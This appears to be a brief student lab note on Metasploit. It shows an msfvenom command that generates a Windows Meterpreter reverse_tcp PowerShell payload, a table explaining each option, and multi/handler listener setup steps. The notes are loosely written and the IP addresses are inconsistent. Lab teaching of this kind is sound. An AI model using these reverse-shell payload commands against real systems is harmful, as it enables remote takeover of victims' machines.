# Metasploit-Task-

Metasploit practical

in kali machine
sudo su

msfconsole

locate Metasploit

nmap -v -pn ip address target machine(192.168.127.135)win 10,win8 etc

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.127.135 LPORT=4444 -f psh-cmd

Part	                                    Meaning

msfvenom	A command-line tool used to generate payloads (combines msfpayload + msfencode)

-p	        Payload option: defines which payload module to use

windows/x64/meterpreter/reverse_tcp	The payload:
                                    🔹 windows: Target OS is Windows
                                    🔹 x64: Architecture is 64-bit
                                    🔹 meterpreter: Uses a Meterpreter shell (advanced remote
                                        shell)                              
                                    🔹 reverse_tcp: The payload will connect back (reverse       
                                        shell) to the attacker's machine via TCP

LHOST=192.168.127.135	             Local Host: The attacker's IP address (where the 
                                      connects back)

LPORT=4444	                     Local Port: The port on the attacker's machine to listen on 
                                     (used by the listener like msfconsole)

-f psh-cmd	                     Output format: Generates the payload as a PowerShell command 

                                     string

and open the another tab 

and run msfconsole means Metasploit

and their type command use /exploit/multi/handler

windows/x64/meterpreter/reverse_tcp ad=> windows/x64/meterpreter/reverse_tcp

show option

ifconfig command 

then set LHOST ip addres of kali Linux(192.168.127.132)

show option

exploit



